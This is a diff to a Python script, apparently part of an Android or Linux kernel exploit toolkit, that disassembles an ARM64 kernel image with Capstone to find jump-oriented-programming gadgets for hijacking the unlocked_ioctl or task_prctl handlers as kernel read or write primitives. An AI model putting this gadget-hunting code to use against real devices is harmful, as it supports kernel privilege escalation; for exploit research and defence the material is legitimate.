@@ -460,19 +460,19 @@ def find_gadget_2_318(kernel):
     return address
 
 
-def find_jop_gadgets(kernel, mode = "read", hijack="ioctl"):
+def find_jop_gadgets(kernel, mode = "jop_read", hijack="unlocked_ioctl"):
     
     print "+++++ find jop gadget mode: %s, type: %s" % (mode, hijack)
 
     # default read mode
-    if hijack == "ioctl":
+    if hijack == "unlocked_ioctl":
         reg_in = ARM64_REG_X2
         reg_out = ARM64_REG_X1
-    elif hijack == "prctl":
+    elif hijack == "task_prctl":
         reg_in = ARM64_REG_X1
         reg_out = ARM64_REG_X0
 
-    if mode == "write":
+    if mode == "jop_write":
         reg_in, reg_out = reg_out, reg_in
 
     md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
@@ -487,7 +487,7 @@ def find_jop_gadgets(kernel, mode = "read", hijack="ioctl"):
 
     print "input reg: %s, output reg: %s" % (reg_dict[reg_in], reg_dict[reg_out])
 
-    gadgets = []
+    gadgets = [mode, hijack]
     while index < count - 2:
         insn1 = insns[index]
         insn2 = insns[index + 1]
@@ -571,6 +571,7 @@ if __name__ == "__main__":
         print "task_prctl:             {:>30}".format("0x%x" % task_prctl)
         print "cap_task_prctl:         {:>30}".format("0x%x" % cap_task_prctl)
         print "****************************************************************"
+
         '''
-        find_jop_gadgets(kernel, mode = "write")
+        find_jop_gadgets(kernel, mode = "jop_write", hijack = "task_prctl")
 
